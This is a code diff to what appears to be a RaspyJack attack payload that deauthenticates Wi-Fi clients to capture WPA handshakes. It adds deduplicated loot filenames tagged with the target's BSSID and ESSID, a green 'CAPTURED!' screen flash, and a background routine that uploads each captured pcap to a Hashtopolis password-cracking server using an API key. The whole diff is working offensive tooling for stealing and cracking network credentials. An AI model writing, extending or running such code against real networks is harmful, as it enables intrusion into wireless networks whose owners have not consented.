@@ -27,6 +27,7 @@ Loot: /root/Raspyjack/loot/Handshakes/hs_YYYYMMDD_HHMMSS.pcap
 import os
 import sys
 import time
+import json
 import threading
 import subprocess
 from datetime import datetime
@@ -70,6 +71,7 @@ lock = threading.Lock()
 ap_list = []         # [{bssid, essid, channel, signal}]
 client_list = []     # [{mac, bssid}]
 eapol_pkts = []      # raw captured EAPOL packets
+captured_bssids = set()  # track captured BSSIDs for deduplication
 handshake_count = 0
 scroll = 0
 selected_idx = 0
@@ -297,6 +299,25 @@ def _scan_clients_thread(iface, target_bssid, target_ch):
 
 
 # ---------------------------------------------------------------------------
+# Visual alert
+# ---------------------------------------------------------------------------
+
+def _flash_green_alert():
+    """Flash the screen green briefly to signal handshake capture."""
+    try:
+        lcd_tmp = LCD_1in44.LCD()
+        lcd_tmp.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
+        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+        d = ScaledDraw(img)
+        d.rectangle((0, 0, 127, 127), fill="#00FF00")
+        d.text((20, 55), "CAPTURED!", font=scaled_font(), fill="#000000")
+        lcd_tmp.LCD_ShowImage(img, 0, 0)
+        time.sleep(0.3)
+    except Exception:
+        pass
+
+
+# ---------------------------------------------------------------------------
 # Deauth + Capture thread
 # ---------------------------------------------------------------------------
 
@@ -381,26 +402,97 @@ def _attack_thread(iface, target_bssid, client_mac, target_ch):
         if hs_count > 0:
             status_msg = f"Captured {hs_count} handshake(s)!"
             phase = "done"
+            captured_bssids.add(target_bssid.upper())
         else:
             total_eapol = sum(len(m) for m in eapol_msgs.values())
             status_msg = f"No full HS ({total_eapol} EAPOL)"
             phase = "client_select"
+
+    # Visual alert: flash green on capture
+    if hs_count > 0:
+        _flash_green_alert()
 
 
 # ---------------------------------------------------------------------------
 # Export
 # ---------------------------------------------------------------------------
 
-def _export_loot():
-    """Write captured EAPOL packets as pcap."""
-    os.makedirs(LOOT_DIR, exist_ok=True)
+def _deduplicated_filename(bssid, essid):
+    """Return a unique filename, appending a counter if a handshake for this
+    BSSID+ESSID pair already exists in LOOT_DIR."""
+    safe_essid = "".join(c if c.isalnum() or c in "-_" else "_" for c in essid)
+    safe_bssid = bssid.replace(":", "")
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filepath = os.path.join(LOOT_DIR, f"hs_{ts}.pcap")
+    base = f"hs_{safe_bssid}_{safe_essid}_{ts}"
+    candidate = os.path.join(LOOT_DIR, f"{base}.pcap")
+    counter = 1
+    while os.path.exists(candidate):
+        candidate = os.path.join(LOOT_DIR, f"{base}_{counter}.pcap")
+        counter += 1
+    return candidate
+
+
+def _export_loot():
+    """Write captured EAPOL packets as pcap with deduplication."""
+    os.makedirs(LOOT_DIR, exist_ok=True)
     with lock:
         pkts = list(eapol_pkts)
+        target = dict(_target_ap) if _target_ap else {}
+    bssid = target.get("bssid", "UNKNOWN")
+    essid = target.get("essid", "unknown")
+    filepath = _deduplicated_filename(bssid, essid)
     if pkts:
         wrpcap(filepath, pkts)
+    # Optionally upload to Hashtopolis in background
+    threading.Thread(target=_hashtopolis_upload, args=(filepath,),
+                     daemon=True).start()
     return os.path.basename(filepath)
+
+
+HASHTOPOLIS_CONFIG = "/root/Raspyjack/loot/Hashtopolis/config.json"
+
+
+def _hashtopolis_upload(filepath):
+    """Upload pcap to Hashtopolis if config exists. Non-blocking."""
+    global status_msg
+    try:
+        if not os.path.isfile(HASHTOPOLIS_CONFIG):
+            return
+        with open(HASHTOPOLIS_CONFIG, "r") as f:
+            cfg = json.load(f)
+        server_url = cfg.get("server_url", "").rstrip("/")
+        api_key = cfg.get("api_key", "")
+        if not server_url or not api_key:
+            return
+        with lock:
+            status_msg = "Uploading to Hashtopolis..."
+        import urllib.request
+        import urllib.error
+        boundary = "----RaspyJackBoundary"
+        filename = os.path.basename(filepath)
+        with open(filepath, "rb") as f:
+            file_data = f.read()
+        body = (
+            f"--{boundary}\r\n"
+            f"Content-Disposition: form-data; name=\"apiKey\"\r\n\r\n"
+            f"{api_key}\r\n"
+            f"--{boundary}\r\n"
+            f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
+            f"Content-Type: application/octet-stream\r\n\r\n"
+        ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()
+        req = urllib.request.Request(
+            f"{server_url}/api/upload",
+            data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+            method="POST",
+        )
+        resp = urllib.request.urlopen(req, timeout=30)
+        code = resp.getcode()
+        with lock:
+            status_msg = f"Upload OK ({code})" if code == 200 else f"Upload: {code}"
+    except Exception as exc:
+        with lock:
+            status_msg = f"Upload fail: {str(exc)[:18]}"
 
 
 # ---------------------------------------------------------------------------
